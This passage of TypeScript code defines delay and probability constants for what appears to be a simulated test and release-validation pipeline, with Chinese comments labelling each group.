export const RegressionDelayConstants: RegressionDelayConstantsType = {
  FUNCTIONAL_TEST_DELAY: 150,
  PERFORMANCE_TEST_DELAY: 120,
  COMPATIBILITY_TEST_DELAY: 180,
  SECURITY_TEST_DELAY: 200,
  BASELINE_DELAY: 100,
  REPORT_DELAY: 250
};

/**
 * 最终验证测试延迟常量
 */
export interface ValidationDelayConstantsType {
  VALIDATION_DELAY: number;
  QUALITY_ASSURANCE_DELAY: number;
  ACCEPTANCE_DELAY: number;
  RELEASE_READINESS_DELAY: number;
  QUALITY_REVIEW_DELAY: number;
  RELEASE_APPROVAL_DELAY: number;
}

export const ValidationDelayConstants: ValidationDelayConstantsType = {
  VALIDATION_DELAY: 200,
  QUALITY_ASSURANCE_DELAY: 180,
  ACCEPTANCE_DELAY: 150,
  RELEASE_READINESS_DELAY: 220,
  QUALITY_REVIEW_DELAY: 250,
  RELEASE_APPROVAL_DELAY: 180
};

/**
 * 验证测试概率常量
 */
export interface ValidationProbabilitiesType {
  APPROVAL_PROBABILITY: number;
  CRITICAL_DEFECT_PROBABILITY: number;
  COVERAGE_PROBABILITY: number;
  CODE_QUALITY_PROBABILITY: number;
  SECURITY_PROBABILITY: number;
  PERFORMANCE_PROBABILITY: number;
}

export const ValidationProbabilities: ValidationProbabilitiesType = {
  APPROVAL_PROBABILITY: 0.3,
  CRITICAL_DEFECT_PROBABILITY: 0.1,
  COVERAGE_PROBABILITY: 0.15,
  CODE_QUALITY_PROBABILITY: 0.05,
  SECURITY_PROBABILITY: 0.05,
  PERFORMANCE_PROBABILITY: 0.05
};
